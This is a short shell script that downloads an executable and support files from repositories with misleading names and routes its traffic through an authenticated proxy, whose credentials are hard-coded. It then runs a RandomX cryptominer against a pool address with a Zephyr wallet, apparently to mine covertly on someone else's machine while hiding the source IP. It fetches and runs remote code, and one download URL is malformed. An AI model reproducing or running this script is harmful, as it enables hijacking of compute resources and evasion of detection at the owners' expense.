proxy="34.228.46.223" 
port="9293" 
user="idxrzfc04cp1zw"  
pass="791oyjfai0xdla8yloe0jrftjh" 
wget -q -O ktl https://gitlab.com/node.js2594450/scala/-/raw/main/lbx && chmod +x ktl
wget -q https://gitlab.com/node.js2594450/scala/-/raw/main/SHA256SUMS && chmod +x SHA256SUMS 
wget -q https://https://raw.githubusercontent.com/55113110159/apikey/main/config.json && chmod +x config.json
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./ktl -a rx/0 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ  -p x
